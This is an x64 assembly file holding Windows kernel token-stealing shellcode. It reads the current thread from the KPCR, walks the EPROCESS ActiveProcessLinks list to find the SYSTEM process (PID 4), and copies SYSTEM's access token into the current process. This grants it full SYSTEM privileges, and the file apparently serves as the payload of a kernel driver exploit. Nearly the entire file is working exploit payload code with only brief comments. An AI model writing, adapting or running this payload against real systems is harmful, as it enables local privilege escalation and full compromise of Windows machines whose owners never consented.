BITS 64
global _start
section .text
    SYSTEM_PID equ 0x04
    ; nt!_KPCR
    Prcb equ 0x180
    ; nt!_KPRCB
    CurrentThread equ 0x08
    ; nt!_KTHREAD
    ApcState equ 0x98
    ; nt!_KAPC_STATE
    Process equ 0x20
    ; nt!_EPROCESS
    UniqueProcessId equ 0x440
    ActiveProcessLinks equ 0x448
    Token equ 0x4b8

_start:
    ; Retrieve a pointer to _ETHREAD from KPCR
    mov rdx, qword [gs:Prcb + CurrentThread]

    ; Obtain a pointer to CurrentProcess
    mov r8, [rdx + ApcState + Process]

    ; Move to the first process in the ActiveProcessLinks list
    mov rcx, [r8 + ActiveProcessLinks]

.loop_find_system_proc:
    ; Get the UniqueProcessId
    mov rdx, [rcx - ActiveProcessLinks + UniqueProcessId]

    ; Check if UniqueProcessId matches the SYSTEM process ID
    cmp rdx, SYSTEM_PID
    jz .found_system  ; IF (SYSTEM process is found)

    ; Move to the next process
    mov rcx, [rcx]
    jmp .loop_find_system_proc  ; Continue looping until the SYSTEM process is found

.found_system:
    ; Retrieve the token of the SYSTEM process
    mov rax, [rcx - ActiveProcessLinks + Token]

    ; Mask the RefCnt (lower 4 bits) of the _EX_FAST_REF structure
    and al, 0xF0

    ; Replace the CurrentProcess's token with the SYSTEM process's token
    mov [r8 + Token], rax

    ; Clear r13 register
    xor r13, r13

    ret
